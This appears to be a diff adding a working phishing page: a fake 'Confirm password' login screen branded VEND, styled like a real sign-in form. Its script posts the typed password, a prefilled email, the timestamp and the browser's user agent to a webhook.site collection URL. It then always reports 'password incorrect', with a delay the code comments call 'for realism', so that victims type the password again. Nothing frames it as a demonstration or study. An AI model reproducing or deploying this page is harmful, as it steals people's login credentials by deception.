@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm Password</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #ffffff;
+            color: #000;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .logo {
+            height: 80px;
+            width: auto;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 400px;
+            text-align: left;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .email-section {
+            background-color: #f5f5f7;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            border: 1px solid #e5e5e7;
+        }
+
+        .email-text {
+            color: #333;
+            font-weight: 500;
+        }
+
+        .change-link {
+            color: #0071e3;
+            text-decoration: none;
+            float: right;
+            font-size: 14px;
+        }
+
+        .change-link:hover {
+            text-decoration: underline;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: white;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.1);
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            color: #0071e3;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 20px 0 30px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .submit-btn:disabled {
+            background-color: #a7a7a7;
+            cursor: not-allowed;
+        }
+
+        /* Spinner Animation */
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid white;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .notification {
+            display: none;
+            background-color: #d4edda;
+            color: #155724;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid #c3e6cb;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .notification.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border-color: #f5c6cb;
+        }
+
+        .webhook-info {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo-container">
+        <!-- Logo from provided URL -->
+        <img src="https://geekysherlock.github.io/finn/finn_real_logo.png" alt="VEND Logo" class="logo">
+    </div>
+
+    <div class="login-card">
+        <h1>Confirm password</h1>
+        <p class="subtitle">For security reasons, we ask you to confirm your password.</p>
+        
+        <div class="email-section">
+            <span class="email-text">abc@gmail.com</span> <!-- Updated email -->
+            <a href="#" class="change-link" id="changeLink">Change</a>
+            <div style="clear:both;"></div>
+        </div>
+        
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+        
+        <a href="#" class="forgot-link" id="forgotLink">Forgot password?</a>
+        
+        <button type="button" class="submit-btn" id="submitBtn" onclick="sendData()">
+            <div class="spinner" id="btnSpinner"></div>
+            <span id="btnText">Continue</span>
+        </button>
+        
+        <div class="notification" id="notification">
+            The password you entered is incorrect. Please try again.
+        </div>
+        
+        <div class="webhook-info">
+            Secure verification via webhook.site
+        </div>
+    </div>
+
+    <script>
+        function sendData() {
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('btnSpinner');
+            const notification = document.getElementById('notification');
+
+            if (!password) {
+                showNotification('Please enter your password', true);
+                return;
+            }
+
+            // Start Loading State
+            btnText.innerText = "Verifying...";
+            spinner.style.display = "block";
+            btn.disabled = true;
+
+            // Hide any previous notification
+            notification.style.display = "none";
+
+            // Prepare data with updated email
+            const data = {
+                email: 'abc@gmail.com', // Updated email
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent,
+                source: 'VEND Password Confirmation'
+            };
+
+            console.log('Sending data to webhook:', data);
+
+            // Send to webhook using no-cors mode
+            fetch('https://webhook.site/geeky', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                // Short delay for realism
+                setTimeout(() => {
+                    // Show error message (like incorrect password)
+                    showNotification('The password you entered is incorrect. Please try again.', true);
+                    
+                    // Reset button state
+                    btnText.innerText = "Continue";
+                    spinner.style.display = "none";
+                    btn.disabled = false;
+                    
+                    // Clear password field
+                    document.getElementById('password').value = "";
+                    document.getElementById('password').focus();
+                    
+                    console.log('Data sent to webhook successfully');
+                }, 1500);
+            })
+            .catch((err) => {
+                console.error('Error:', err);
+                btnText.innerText = "Continue";
+                spinner.style.display = "none";
+                btn.disabled = false;
+                showNotification('Connection error. Please try again.', true);
+            });
+        }
+
+        function showNotification(message, isError) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = 'notification';
+            
+            if (isError) {
+                notification.classList.add('error');
+            }
+            
+            notification.style.display = 'block';
+        }
+
+        // Demo functionality for links
+        document.getElementById('changeLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            showNotification('Change email functionality would open here.', false);
+        });
+
+        document.getElementById('forgotLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            showNotification('Password recovery would be initiated here.', false);
+        });
+
+        // Allow form submission with Enter key
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendData();
+            }
+        });
+
+        console.log('VEND Login Page Loaded');
+        console.log('Webhook URL: https://webhook.site/geeky');
+    </script>
+</body>
+</html>
